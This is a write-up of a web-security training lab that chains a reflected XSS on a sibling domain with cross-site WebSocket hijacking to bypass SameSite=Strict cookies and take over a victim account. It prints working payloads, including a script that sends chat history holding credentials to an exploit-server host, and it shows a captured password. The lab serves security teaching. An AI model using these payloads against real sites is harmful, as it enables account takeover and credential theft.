## SameSite Strict bypass via sibling domain

This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.

To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history. The chat history contains the login credentials in plain text.

Hint :

Make sure you fully audit all of the available attack surface. Keep an eye out for additional vulnerabilities that may help you to deliver your attack, and bear in mind that two domains can be located within the same site.

## Notes

- Exploit server
- /login
- /admin
- /chat (ws)
- SameSite=Strict cookies
- Reflected XSS on sibling domain
- Access-Control-Allow-Origin disclosure

## Resume

1. Find the sibling domain
2. Find the XSS
3. Confirm the CSWSH
4. Bypass SameSite using sibling domain
5. Exfiltrate chat history
6. Retrieve victim credentials
7. Log in with victim account

## Solve

The first step is to identify additional domains belonging to the same site.

While browsing the application, we inspect static resources and discover a sibling domain in the response headers:

```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Cache-Control: public, max-age=3600
Access-Control-Allow-Origin: https://cms-0a00009f0457a5598039263200760092.web-security-academy.net
X-Frame-Options: SAMEORIGIN
Content-Length: 3561
```

Sibling domain:

```
https://cms-0a00009f0457a5598039263200760092.web-security-academy.net
```

Next, we inspect the live chat functionality.

The WebSocket handshake does not contain any unpredictable token and appears vulnerable to CSWSH:

```http
GET /chat HTTP/2
Host: 0a00009f0457a5598039263200760092.web-security-academy.net
Upgrade: websocket
```

After refreshing the page, we observe that the browser sends:

```
READY
```

and receives the complete chat history.

We create a CSWSH proof of concept:

```html
<script>
  var ws = new WebSocket('wss://0a00009f0457a5598039263200760092.web-security-academy.net/chat');

  ws.onopen = function () {
    ws.send("READY");
  };

  ws.onmessage = function (event) {
    fetch(
      'https://exploit-0ae600d304fea5dc80f22592016e008f.exploit-server.net/?' + event.data,
      { mode: 'no-cors' }
    );
  };
</script>
```

However, when testing it we notice that session cookies are not sent.

Investigating further, we observe that the application uses:

```
Set-Cookie: session=...; SameSite=Strict
```

This prevents cross-site requests from including authenticated cookies.

We therefore look for another vulnerability on the sibling domain.

Browsing to the CMS application reveals a login form vulnerable to reflected XSS:

```http
POST /login HTTP/2
Host: cms-0a00009f0457a5598039263200760092.web-security-academy.net

username=<script>alert(1)</script>&password=foo
```

The payload executes successfully.

We then convert the request to a GET request and verify that the XSS still works:

```
https://cms-0a00009f0457a5598039263200760092.web-security-academy.net/login?username=<script>alert(1)</script>&password=foo
```

Because the CMS domain is a sibling domain within the same site, requests initiated from it are considered same-site and bypass SameSite restrictions.

Next, we URL-encode the CSWSH payload and inject it through the vulnerable username parameter.

Encoded payload:

```
%3Cscript%3Evar%20ws%20%3D%20new%20WebSocket(%27wss%3A%2F%2F0a00009f0457a5598039263200760092.web-security-academy.net%2Fchat%27)%3Bws.onopen%20%3D%20function()%20%7Bws.send(%22READY%22)%3B%7D%3Bws.onmessage%20%3D%20function(event)%20%7Bfetch(%27https%3A%2F%2Fexploit-0ae600d304fea5dc80f22592016e008f.exploit-server.net%2F%3F%27%20%2B%20event.data%2C%20%7Bmode%3A%20%27no-cors%27%7D)%3B%7D%3B%3C%2Fscript%3E
```

Final exploit hosted on the exploit server:

```html
<script>
document.location='https://cms-0a00009f0457a5598039263200760092.web-security-academy.net/login?username=%3Cscript%3Evar%20ws%20%3D%20new%20WebSocket(%27wss%3A%2F%2F0a00009f0457a5598039263200760092.web-security-academy.net%2Fchat%27)%3Bws.onopen%20%3D%20function()%20%7Bws.send(%22READY%22)%3B%7D%3Bws.onmessage%20%3D%20function(event)%20%7Bfetch(%27https%3A%2F%2Fexploit-0ae600d304fea5dc80f22592016e008f.exploit-server.net%2F%3F%27%20%2B%20event.data%2C%20%7Bmode%3A%20%27no-cors%27%7D)%3B%7D%3B%3C%2Fscript%3E&password=foo';
</script>
```

When the victim loads the exploit:

- XSS executes on the CMS domain
- SameSite restrictions are bypassed
- Authenticated WebSocket connection is established
- Chat history is exfiltrated to the exploit server

Server logs reveal the victim's credentials:

```
{"user":"Hal Pline","content":"No problem carlos, it's adh2928qzwfp3gyofq0p"}
```

Using these credentials, we log in to the victim account and solve the lab.